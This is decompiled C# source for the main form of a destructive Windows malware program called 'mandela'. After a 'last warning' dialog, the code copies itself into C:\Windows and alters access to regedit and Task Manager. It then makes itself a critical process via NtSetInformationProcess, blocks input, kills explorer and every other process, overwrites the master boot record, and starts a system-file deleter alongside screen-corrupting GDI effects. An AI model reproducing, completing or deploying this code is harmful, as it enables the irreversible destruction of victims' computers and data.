using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using AxWMPLib;
using CsharpGDI;
using WMPLib;

namespace mandela
{
	// Token: 0x02000006 RID: 6
	public partial class WarnWin : Form
	{
		// Token: 0x0600000E RID: 14
		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

		// Token: 0x0600000F RID: 15 RVA: 0x00003588 File Offset: 0x00001788
		public WarnWin()
		{
			this.InitializeComponent();
			if (!File.Exists("C:\\Windows\\System32\\UserAccountControlSettings.exe"))
			{
				try
				{
					Process[] processes = Process.GetProcesses();
					for (int i = 0; i < processes.Length; i++)
					{
						processes[i].Kill();
					}
				}
				catch
				{
				}
			}
			File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
		}

		// Token: 0x06000010 RID: 16 RVA: 0x0000366C File Offset: 0x0000186C
		private void WarnWin_Load(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Windows\\mandela.exe") && !File.Exists("C:\\Windows\\last_thing.sys"))
			{
				gdi32.BlockInput(true);
				File.Create("C:\\Windows\\last_thing.sys");
				Thread.Sleep(3000);
				Cmd_Class.cmd("taskkill /f /im explorer.exe");
				this.disable_everything();
				base.WindowState = FormWindowState.Maximized;
				base.FormBorderStyle = FormBorderStyle.None;
				Cursor.Hide();
				this.ax = new AxWindowsMediaPlayer();
				base.Controls.Add(this.ax);
				this.ax.uiMode = "none";
				this.ax.stretchToFit = true;
				this.ax.Dock = DockStyle.Fill;
				this.ax.PlayStateChange += this.player_PlayStateChange;
				this.ax.URL = WarnWin.res_path + this.video;
				this.ax.Ctlcontrols.play();
				this.timer_3.Start();
				return;
			}
			if (File.Exists("C:\\Windows\\last_thing.sys"))
			{
				Thread.Sleep(5000);
				Process.EnterDebugMode();
				WarnWin.NtSetInformationProcess(Process.GetCurrentProcess().Handle, this.int_1, ref this.int_0, 4);
				base.Location = new Point(this.int_2, this.int_3);
				base.FormBorderStyle = FormBorderStyle.None;
				base.Opacity = 0.0;
				this.disable_everything();
				object obj = new gdi();
				Titles titles = new Titles();
				System_Corrupter system_Corrupter = new System_Corrupter();
				Thread thread = new Thread(new ThreadStart(obj.gdi_payload4));
				Thread thread2 = new Thread(new ThreadStart(titles.window_title));
				Thread thread3 = new Thread(new ThreadStart(system_Corrupter.sys_del));
				thread.Start();
				thread2.Start();
				thread3.Start();
				new Mbr_Writter().Mbr();
				new Beats().beat(4, 30, 1, 800);
				new Thread(new ThreadStart(new Payload_Timer().timer)).Start();
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x0000386C File Offset: 0x00001A6C
		public void player_PlayStateChange(object sender, _WMPOCXEvents_PlayStateChangeEvent e)
		{
			if (this.ax.playState == WMPPlayState.wmppsReady)
			{
				this.ax.settings.volume = 100;
				this.ax.Ctlcontrols.play();
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000038AC File Offset: 0x00001AAC
		private void timer_0_Tick(object sender, EventArgs e)
		{
			Random random = new Random();
			this.timer_0.Interval = random.Next(300, 1000);
			int num = random.Next(15);
			if (num == 0)
			{
				this.pictureBox1.Visible = false;
				this.pictureBox2.Visible = true;
				this.pictureBox3.Visible = false;
				this.pictureBox4.Visible = false;
				this.pictureBox5.Visible = false;
				this.pictureBox6.Visible = false;
				this.pictureBox7.Visible = false;
				this.pictureBox8.Visible = false;
				return;
			}
			if (num == 1)
			{
				this.pictureBox1.Visible = false;
				this.pictureBox2.Visible = false;
				this.pictureBox3.Visible = true;
				this.pictureBox4.Visible = false;
				this.pictureBox5.Visible = false;
				this.pictureBox6.Visible = false;
				this.pictureBox7.Visible = false;
				this.pictureBox8.Visible = false;
				return;
			}
			if (num == 2)
			{
				this.pictureBox1.Visible = false;
				this.pictureBox2.Visible = false;
				this.pictureBox3.Visible = false;
				this.pictureBox4.Visible = true;
				this.pictureBox5.Visible = false;
				this.pictureBox6.Visible = false;
				this.pictureBox7.Visible = false;
				this.pictureBox8.Visible = false;
				return;
			}
			if (num == 3)
			{
				this.pictureBox1.Visible = false;
				this.pictureBox2.Visible = false;
				this.pictureBox3.Visible = false;
				this.pictureBox4.Visible = false;
				this.pictureBox5.Visible = true;
				this.pictureBox6.Visible = false;
				this.pictureBox7.Visible = false;
				this.pictureBox8.Visible = false;
				return;
			}
			if (num == 4)
			{
				this.pictureBox1.Visible = false;
				this.pictureBox2.Visible = false;
				this.pictureBox3.Visible = false;
				this.pictureBox4.Visible = false;
				this.pictureBox5.Visible = false;
				this.pictureBox6.Visible = true;
				this.pictureBox7.Visible = false;
				this.pictureBox8.Visible = false;
				return;
			}
			if (num == 5)
			{
				this.pictureBox1.Visible = false;
				this.pictureBox2.Visible = false;
				this.pictureBox3.Visible = false;
				this.pictureBox4.Visible = false;
				this.pictureBox5.Visible = false;
				this.pictureBox6.Visible = false;
				this.pictureBox7.Visible = true;
				this.pictureBox8.Visible = false;
				return;
			}
			if (num == 6)
			{
				this.pictureBox1.Visible = false;
				this.pictureBox2.Visible = false;
				this.pictureBox3.Visible = false;
				this.pictureBox4.Visible = false;
				this.pictureBox5.Visible = false;
				this.pictureBox6.Visible = false;
				this.pictureBox7.Visible = false;
				this.pictureBox8.Visible = true;
				return;
			}
			this.pictureBox1.Visible = true;
			this.pictureBox2.Visible = false;
			this.pictureBox3.Visible = false;
			this.pictureBox4.Visible = false;
			this.pictureBox5.Visible = false;
			this.pictureBox6.Visible = false;
			this.pictureBox7.Visible = false;
			this.pictureBox8.Visible = false;
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00003C14 File Offset: 0x00001E14
		private void button2_Click(object sender, EventArgs e)
		{
			Environment.Exit(-1);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00003C28 File Offset: 0x00001E28
		public void def_values()
		{
			this.button1.Location = this.point_0;
			this.button1.ForeColor = Color.Silver;
			this.button1.BackColor = Color.Transparent;
			this.button2.Location = this.point_1;
			this.button2.ForeColor = Color.Silver;
			this.button2.BackColor = Color.Transparent;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00003C98 File Offset: 0x00001E98
		private void button1_MouseHover(object sender, EventArgs e)
		{
			if (!this.bool_0)
			{
				this.timer_1.Start();
				this.bool_0 = true;
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00003CC0 File Offset: 0x00001EC0
		private void button1_MouseLeave(object sender, EventArgs e)
		{
			this.bool_0 = false;
			this.timer_1.Stop();
			this.def_values();
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00003CE8 File Offset: 0x00001EE8
		private void timer_1_Tick(object sender, EventArgs e)
		{
			Random random = new Random();
			this.button1.Location = new Point(this.point_0.X - random.Next(-5, 5), this.point_0.Y - random.Next(-5, 5));
			this.button1.ForeColor = Color.FromArgb(random.Next(255), random.Next(255), random.Next(255));
			this.button1.BackColor = Color.FromArgb(random.Next(100), random.Next(100), random.Next(100));
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00003D98 File Offset: 0x00001F98
		private void button2_MouseHover(object sender, EventArgs e)
		{
			if (!this.bool_1)
			{
				this.UwLnLdKmu.Start();
				this.bool_1 = true;
			}
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00003DC0 File Offset: 0x00001FC0
		private void button2_MouseLeave(object sender, EventArgs e)
		{
			this.bool_1 = false;
			this.UwLnLdKmu.Stop();
			this.def_values();
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00003DE8 File Offset: 0x00001FE8
		private void UwLnLdKmu_Tick(object sender, EventArgs e)
		{
			Random random = new Random();
			this.button2.Location = new Point(this.point_1.X - random.Next(-5, 5), this.point_1.Y - random.Next(-5, 5));
			this.button2.ForeColor = Color.FromArgb(random.Next(255), random.Next(255), random.Next(255));
			this.button2.BackColor = Color.FromArgb(random.Next(100), random.Next(100), random.Next(100));
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00003E98 File Offset: 0x00002098
		private void button1_Click(object sender, EventArgs e)
		{
			new Random();
			this.disable_everything();
			base.Hide();
			if (MessageBox.Show("ARE YOU REALLY SURE YOU WANT TO RUN THIS MALWARE!?" + Environment.NewLine + Environment.NewLine + "THIS IS THE LAST WARNING!!!", "LAST WARNING!!!", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.No)
			{
				Environment.Exit(-1);
			}
			if (!Directory.Exists(WarnWin.res_path))
			{
				Directory.CreateDirectory(WarnWin.res_path);
			}
			foreach (string text in WarnWin.images)
			{
				Extract_class.Extract("mandela", WarnWin.res_path, "Resources", text);
				File.SetAttributes(WarnWin.res_path + text, FileAttributes.Hidden);
			}
			foreach (string text2 in WarnWin.images2)
			{
				Extract_class.Extract("mandela", WarnWin.res_path, "Resources", text2);
				File.SetAttributes(WarnWin.res_path + text2, FileAttributes.Hidden);
			}
			Extract_class.Extract("mandela", WarnWin.res_path, "Resources", this.video);
			File.SetAttributes(WarnWin.res_path + this.video, FileAttributes.Hidden);
			new Thread(new ThreadStart(new Regs().reg)).Start();
			File.Copy(Application.ExecutablePath, "C:\\Windows\\mandela.exe");
			File.SetAttributes("C:\\Windows\\mandela.exe", FileAttributes.Hidden);
			File_Acces.Custom_Acc("C:\\Windows", WarnWin.sys_files[0]);
			File_Acces.Custom_Acc("C:\\Windows\\System32", WarnWin.sys_files[1]);
			new Thread(new ThreadStart(new Titles().window_title)).Start();
			Beats beats = new Beats();
			Thread thread = new Thread(new ThreadStart(new gdi().gdi_payload));
			beats.beat(0, 30, 2, 800);
			thread.Start();
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00004068 File Offset: 0x00002268
		private void WarnWin_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x0000407C File Offset: 0x0000227C
		private void timer_2_Tick(object sender, EventArgs e)
		{
			if (gdi.isscary)
			{
				this.timer_2.Stop();
				Cmd_Class.cmd("taskkill /f /im explorer.exe");
				gdi.isscary = false;
				base.Hide();
				base.Close();
			}
		}

		// Token: 0x0600001E RID: 30 RVA: 0x000040B8 File Offset: 0x000022B8
		public void disable_everything()
		{
			this.pictureBox1.Visible = false;
			this.pictureBox2.Visible = false;
			this.pictureBox3.Visible = false;
			this.pictureBox4.Visible = false;
			this.pictureBox5.Visible = false;
			this.pictureBox6.Visible = false;
			this.pictureBox7.Visible = false;
			this.pictureBox8.Visible = false;
			this.button1.Enabled = false;
			this.button1.Visible = false;
			this.bool_0 = true;
			this.button2.Enabled = false;
			this.button2.Visible = false;
			this.bool_1 = true;
			this.timer_0.Enabled = false;
			this.timer_0.Stop();
			this.timer_1.Stop();
			this.timer_1.Enabled = false;
			this.UwLnLdKmu.Stop();
			this.UwLnLdKmu.Enabled = false;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x000041A8 File Offset: 0x000023A8
		private void timer_3_Tick(object sender, EventArgs e)
		{
			this.timer_3.Stop();
			base.Hide();
			new Thread(new ThreadStart(new gdi().gdi_payload3)).Start();
		}

		// Token: 0x04000003 RID: 3
		private int int_0 = 1;

		// Token: 0x04000004 RID: 4
		private int int_1 = 29;

		// Token: 0x04000005 RID: 5
		public static string res_path = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\";

		// Token: 0x04000006 RID: 6
		public static string[] images = new string[] { "entity.bmp", "man.bmp", "mask.bmp", "intruder.bmp", "momo.bmp", "nosleep.bmp", "nosleep2.bmp", "smile.bmp", "watching.bmp" };

		// Token: 0x04000007 RID: 7
		public static string[] images2 = new string[] { "cybersoldier.bmp", "cybersoldier_angry.bmp" };

		// Token: 0x04000008 RID: 8
		public string video = "education.mp4";

		// Token: 0x04000009 RID: 9
		public static string[] sys_files = new string[] { "regedit.exe", "taskmgr.exe" };

		// Token: 0x0400000A RID: 10
		private int int_2 = Screen.PrimaryScreen.Bounds.Width;

		// Token: 0x0400000B RID: 11
		private int int_3 = Screen.PrimaryScreen.Bounds.Height;

		// Token: 0x0400000C RID: 12
		public static int counter = 0;

		// Token: 0x0400000D RID: 13
		public AxWindowsMediaPlayer ax;

		// Token: 0x0400000E RID: 14
		private Point point_0 = new Point(140, 377);

		// Token: 0x0400000F RID: 15
		private Point point_1 = new Point(330, 377);

		// Token: 0x04000010 RID: 16
		private bool bool_0;

		// Token: 0x04000011 RID: 17
		private bool bool_1;
	}
}
